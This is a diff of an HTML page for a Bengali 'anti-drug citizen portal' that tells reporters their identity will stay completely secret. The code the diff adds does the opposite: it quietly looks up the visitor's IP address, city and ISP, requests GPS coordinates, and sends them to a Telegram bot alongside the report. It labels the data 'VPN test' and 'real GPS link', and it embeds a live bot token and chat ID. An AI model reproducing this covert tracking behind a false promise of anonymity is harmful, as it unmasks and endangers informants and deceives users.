@@ -4,91 +4,146 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>মাদকবিরোধী নাগরিক পোর্টাল</title>
-    <!-- Tailwind CSS for modern look -->
-    <script src="https://cdn.tailwindcss.com"></script>
-    <style>
-        body { background-color: #0f172a; }
-        .glass-card { background: rgba(30, 41, 59, 0.7); backdrop-filter: blur(10px); }
-    </style>
-</head>
-<body class="text-gray-100 min-h-screen flex items-center justify-center p-4">
+    <script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4"></script>
+    
+    <!-- PWA এর জন্য লিংক -->
+    <link rel="manifest" href="manifest.json">
+    <meta name="theme-color" content="#111827">
 
-    <div class="glass-card p-8 rounded-2xl shadow-2xl w-full max-w-md border border-gray-700">
-        <!-- Icon & Header -->
+    <script>
+        // service worker রেজিস্টার করা
+        if ('serviceWorker' in navigator) {
+            navigator.serviceWorker.register('sw.js')
+                .then(() => console.log('PWA Service Worker Registered'))
+                .catch(err => console.log('Service Worker Failed', err));
+        }
+    </script>
+</head>
+<body class="bg-gray-900 text-gray-100 min-h-screen flex items-center justify-center p-4">
+
+    <div class="w-full max-w-md bg-gray-800 rounded-xl shadow-2xl p-6 border border-gray-700">
         <div class="text-center mb-6">
-            <div class="text-5xl mb-2">🚨</div>
-            <h1 class="text-2xl font-extrabold text-white">নাগরিক রিপোর্ট পোর্টাল</h1>
-            <p class="text-xs text-gray-400 mt-2 uppercase tracking-widest">গোপনীয়তা নিশ্চিত</p>
+            <h1 class="text-2xl font-bold text-red-500 mb-2">🚨 মাদকবিরোধী নাগরিক পোর্টাল</h1>
+            <p class="text-sm text-gray-400">আপনার পরিচয় সম্পূর্ণ গোপন থাকবে। সঠিক তথ্য দিয়ে সহযোগিতা করুন।</p>
         </div>
 
-        <form id="reportForm" onsubmit="submitReport(event)" class="space-y-5">
-            <!-- Crime Type -->
+        <form id="reportForm" class="space-y-4">
             <div>
-                <label class="block text-sm font-medium mb-1 text-gray-300">অপরাধের ধরন</label>
-                <select name="crimeType" class="w-full bg-gray-900 border border-gray-600 rounded-xl p-3 focus:ring-2 focus:ring-red-500 outline-none transition">
-                    <option>মাদক কেনাবেচা / খুচরা বিক্রয়</option>
-                    <option>মাদক সেবন</option>
-                    <option>অন্যান্য</option>
+                <label class="block text-sm font-medium text-gray-300 mb-1">অপরাধের ধরন সিলেক্ট করুন</label>
+                <select id="category" class="w-full bg-gray-700 border border-gray-600 rounded-lg px-3 py-2 text-white focus:outline-none focus:border-red-500" required>
+                    <option value="">বাছাই করুন...</option>
+                    <option value="মাদক বেচাকেনা / খুচরা বিক্রয়">মাদক বেচাকেনা / খুচরা বিক্রয়</option>
+                    <option value="মাদক মজুদ / আস্তানা">মাদক মজুদ / আস্তানা</option>
+                    <option value="মাদক চোরাচালান / রুট">মাদক চোরাচালান / রুট</option>
+                    <option value="অন্যান্য অপরাধমূলক কর্মকাণ্ড">অন্যান্য অপরাধমূলক কর্মকাণ্ড</option>
                 </select>
             </div>
-            
-            <!-- Location -->
+
             <div>
-                <label class="block text-sm font-medium mb-1 text-gray-300">সুনির্দিষ্ট ঠিকানা</label>
-                <input type="text" name="location" placeholder="এলাকার নাম বা ঠিকানা..." required class="w-full bg-gray-900 border border-gray-600 rounded-xl p-3 focus:ring-2 focus:ring-red-500 outline-none transition">
+                <label class="block text-sm font-medium text-gray-300 mb-1">সুনির্দিষ্ট এলাকা বা ঠিকানা</label>
+                <input type="text" id="location" placeholder="উদা: রোড নং-৪, ব্লক-ডি, মিরপুর" class="w-full bg-gray-700 border border-gray-600 rounded-lg px-3 py-2 text-white placeholder-gray-500 focus:outline-none focus:border-red-500" required>
             </div>
 
-            <!-- Details -->
             <div>
-                <label class="block text-sm font-medium mb-1 text-gray-300">বিস্তারিত বিবরণ</label>
-                <textarea name="details" rows="3" placeholder="ঘটনার বিস্তারিত লিখুন..." class="w-full bg-gray-900 border border-gray-600 rounded-xl p-3 focus:ring-2 focus:ring-red-500 outline-none transition"></textarea>
+                <label class="block text-sm font-medium text-gray-300 mb-1">বিস্তারিত বিবরণ (যদি থাকে)</label>
+                <textarea id="description" rows="3" placeholder="অপরাধের সময়, নির্দিষ্ট স্পট বা সন্দেহভাজনদের সম্পর্কে বিস্তারিত লিখুন..." class="w-full bg-gray-700 border border-gray-600 rounded-lg px-3 py-2 text-white placeholder-gray-500 focus:outline-none focus:border-red-500"></textarea>
             </div>
 
-            <!-- Submit Button -->
-            <button type="submit" class="w-full bg-gradient-to-r from-red-600 to-red-800 hover:from-red-700 hover:to-red-900 text-white font-bold py-3 rounded-xl shadow-lg transition transform active:scale-95">
+            <button type="submit" id="submitBtn" class="w-full bg-red-600 hover:bg-red-700 text-white font-bold py-2.5 px-4 rounded-lg transition duration-200">
                 নিরাপদে রিপোর্ট সাবমিট করুন
             </button>
         </form>
 
-        <div id="status-message" class="mt-4 text-center font-semibold text-sm"></div>
+        <div id="responseMessage" class="mt-4 p-3 rounded-lg text-sm text-center hidden"></div>
     </div>
 
-    <script>
-        const submitReport = async (event) => {
-            event.preventDefault();
-            const submitButton = event.target.querySelector('button[type="submit"]');
-            const statusMessage = document.getElementById('status-message');
-            
-            submitButton.disabled = true;
-            submitButton.innerText = 'প্রক্রিয়াধীন...';
-            statusMessage.innerText = '';
+<script>
+const TELEGRAM_TOKEN = "8868947145:AAFjXyUwInMs1bGzhEvV9Oyla1eGkaKbbVg";
+const CHAT_ID = "8766925591";
 
-            const formData = new FormData(event.target);
+document.getElementById('reportForm').addEventListener('submit', async function(e) {
+    e.preventDefault();
+    
+    const submitBtn = document.getElementById('submitBtn');
+    const responseMessage = document.getElementById('responseMessage');
+    
+    submitBtn.disabled = true;
+    submitBtn.innerText = "প্রসেস হচ্ছে...";
+    responseMessage.classList.add('hidden');
 
-            try {
-                const response = await fetch('https://security-verify-g92g.vercel.app/api/submit-report', {
-                    method: 'POST',
-                    body: formData
-                });
+    const category = document.getElementById('category').value;
+    const locationInput = document.getElementById('location').value;
+    const description = document.getElementById('description').value || "কোনো বিবরণ দেওয়া হয়নি।";
 
-                const result = await response.json();
+    let ipInfo = "আইপি তথ্য পাওয়া যায়নি।";
+    let gpsInfo = "ইউজার জিপিএস পারমিশন দেয়নি/ব্লক করেছে।";
 
-                if (response.ok && result.success) {
-                    statusMessage.innerText = '✅ রিপোর্ট সফলভাবে পাঠানো হয়েছে।';
-                    statusMessage.style.color = '#10B981';
-                    event.target.reset();
-                } else {
-                    statusMessage.innerText = '❌ ' + (result.error || 'সেন্ড করতে ব্যর্থ।');
-                    statusMessage.style.color = '#EF4444';
-                }
-            } catch (error) {
-                statusMessage.innerText = '⚠️ সার্ভারের সাথে যোগাযোগ করা যাচ্ছে না।';
-                statusMessage.style.color = '#EF4444';
-            } finally {
-                submitButton.disabled = false;
-                submitButton.innerText = 'নিরাপদে রিপোর্ট সাবমিট করুন';
+    try {
+        const ipResponse = await fetch('https://ipapi.co/json/');
+        if(ipResponse.ok) {
+            const data = await ipResponse.json();
+            ipInfo = `🌐 আইপি: ${data.ip}\n🌍 দেশ/শহর: ${data.country_name} (${data.city})\n🏢 আইএসপি: ${data.org}`;
+        }
+    } catch (err) {
+        ipInfo = "আইপি এপিআই রিকোয়েস্ট ব্যর্থ হয়েছে।";
+    }
+
+    if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+            async (position) => {
+                const lat = position.coords.latitude;
+                const lon = position.coords.longitude;
+                gpsInfo = `📍 আসল জিপিএস লিংক:\nhttps://www.google.com/maps?q=${lat},${lon}`;
+                await sendToTelegram(category, locationInput, description, ipInfo, gpsInfo, submitBtn, responseMessage);
+            },
+            async () => {
+                await sendToTelegram(category, locationInput, description, ipInfo, gpsInfo, submitBtn, responseMessage);
             }
-        };
-    </script>
+        );
+    } else {
+        gpsInfo = "এই ব্রাউজারে জিপিএস এপিআই সাপোর্ট করে না।";
+        await sendToTelegram(category, locationInput, description, ipInfo, gpsInfo, submitBtn, responseMessage);
+    }
+});
+
+async function sendToTelegram(category, loc, desc, ip, gps, btn, resMsg) {
+    const fullText = `🚨 *নতুন মাদকবিরোধী রিপোর্ট*\n\n` +
+                      `📌 *অপরাধের ধরন:* ${category}\n` +
+                      `📍 *ইউজারের দেওয়া ঠিকানা:* ${loc}\n` +
+                      `📝 *বিস্তারিত বিবরণ:* ${desc}\n\n` +
+                      `🔍 *নেটওয়ার্ক তথ্য (VPN টেস্ট):*\n${ip}\n\n` +
+                      `${gps}`;
+
+    const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
+
+    try {
+        const response = await fetch(url, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: CHAT_ID,
+                text: fullText,
+                parse_mode: 'Markdown'
+            })
+        });
+
+        if (response.ok) {
+            resMsg.className = "mt-4 p-3 rounded-lg text-sm text-center bg-green-900 text-green-300";
+            resMsg.innerText = "রিপোর্টটি সফলভাবে এবং নিরাপদে পাঠানো হয়েছে!";
+            document.getElementById('reportForm').reset();
+        } else {
+            resMsg.className = "mt-4 p-3 rounded-lg text-sm text-center bg-red-900 text-red-300";
+            resMsg.innerText = "টেলিগ্রাম কনফিগারেশনে সমস্যা!";
+        }
+    } catch (error) {
+        resMsg.className = "mt-4 p-3 rounded-lg text-sm text-center bg-red-900 text-red-300";
+        resMsg.innerText = "নেটওয়ার্ক ত্রুটি!";
+    } finally {
+        resMsg.classList.remove('hidden');
+        btn.disabled = false;
+        btn.innerText = "নিরাপদে রিপোর্ট সাবমিট করুন";
+    }
+}
+</script>
 </body>
 </html>
